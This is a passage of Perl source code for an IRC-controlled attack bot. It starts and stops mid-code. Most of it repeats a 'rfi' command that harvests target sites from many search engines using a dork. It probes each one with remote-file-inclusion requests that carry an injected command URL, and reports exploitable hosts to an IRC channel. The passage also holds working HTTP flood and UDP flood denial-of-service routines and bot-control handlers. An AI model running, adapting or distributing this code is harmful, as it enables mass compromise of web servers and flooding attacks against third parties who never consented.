sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @mlist=&msn($dork);\npush(my @tot, @mlist );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034mSn\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034mSn\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034mSn\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @allist=&alltheweb($dork);\npush(my @tot, @allist );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aLLthewEb\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aLLthewEb\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aLLthewEb\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @asklist=&ask($dork);\npush(my @tot, @asklist );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aSk\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aSk\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aSk\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @uollist=&uol($dork);\npush(my @tot, @uollist );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034uoL\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034uoL\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034uoL\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @alist=&altavista($dork);\npush(my @tot, @alist );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aLtaviSta\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aLtaviSta\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034aLtaviSta\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @naver=&naver($dork);\npush(my @tot, @naver );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034nAvEr\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034nAvEr\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034nAvEr\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @baidu=&baidu($dork);\npush(my @tot, @baidu );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034bAidu\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034bAidu\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034bAidu\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @fireball=&fireball($dork);\npush(my @tot, @fireball );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034fiRebaLL\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034fiRebaLL\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034fiRebaLL\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @guruji=&guruji($dork);\npush(my @tot, @guruji );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034guRuji\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034guRuji\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034guRuji\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @mozbot=&mozbot($dork);\npush(my @tot, @mozbot );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034mOzBot\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034mOzBot\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034mOzBot\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n#\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n\tmy @ylist=&yahoo($dork);\n\tmy @yalist=&yahooa($dork);\n\tmy @yblist=&yahoob($dork);\n\tmy @yclist=&yahooc($dork);\n\tmy @ydlist=&yahood($dork);\n\t\tpush(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist );\npush(my @tot, @yahoobypass );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034yaHoo\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034yaHoo\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034yaHoo\u000312\u001f)\u000f\u00037 sCaN fiNniShed for $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(7);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Osirys/ && $re =~ /id:/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00037\u0002OFF\u0002\u000314): \u00034$print \");\n\n}}\nelsif($re =~ /Osirys/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314(\u00032Safe Mode = \u00033\u0002ON\u0002\u000314): \u000312$print \");\n}}\n}}}\nexit;\n}}\n\n######################\n#     HTTPFlood      #\n#                    #\n######################\nif ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314\u0002(\u0002\u00032HttpFlood\u000314\u0002)\u0002\u00033 Attacking\u0003 \u000314 \".$1.\" \u00032 on port 80 for \u000314 \".$2.\" \u00033 seconds \u0003.\");\nmy $itime = time;\nmy ($cur_time);\n$cur_time = time - $itime;\nwhile ($2>$cur_time){\n$cur_time = time - $itime;\nmy $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);\nprint $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";\nclose($socket);\n}\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314\u0002(\u0002\u00032HttpFlood\u000314\u0002)\u0002\u00033 Attacking selesai\u0003 \u000314 \".$1.\".\");\n}\n######################\n#  End of HTTPFlood  #\n#                    #\n######################\n\n######################\n#     UDPFlood       #\n#                    #\n######################\nif ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314\u0002(\u0002\u00032UDPFlood\u000314\u0002)\u0002\u00033 Attacking \u000314 \".$1.\" \u00033 with \u00034 \".$2.\" \u00033 Kb Packets for \u000314 \".$3.\" \u00033 seconds.\u0003\");\nmy ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");\n$dtime = 1 if $dtime == 0;\nmy %bytes;\n$bytes{igmp} = $2 * $pacotes{igmp};\n$bytes{icmp} = $2 * $pacotes{icmp};\n$bytes{o} = $2 * $pacotes{o};\n$bytes{udp} = $2 * $pacotes{udp};\n$bytes{tcp} = $2 * $pacotes{tcp};\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000314\u0002(\u0002\u00032UDPFlood\u000314\u0002)\u0002\u00033 Results \u000314 \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" \u00033Kb in\u000314 \".$dtime.\" \u00033seconds to\u000314 \".$1.\".\");\n}\nexit;\n\n######################\n#  End of Udpflood   #\n#                    #\n######################\n\n\nsub ircase {\nmy ($kem, $printl, $case) = @_;\n  if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   }\n   if ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\nif ($case =~ /^rejoin\\s+(.*)/) {\nmy $chan = $1;\nif ($chan =~ /^(\\d+) (.*)/) {\nfor (my $ca = 1; $ca <= $1; $ca++ ) {\np(\"$2\");\nj(\"$2\");\n}\n}\nelse {\np(\"$chan\");\nj(\"$chan\");\n}\n}\n\nif ($case =~ /^op/) {\nop(\"$printl\", \"$kem\") if $case eq \"op\";\nmy $oarg = substr($case, 3);\nop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n}\n\nif ($case =~ /^deop/) 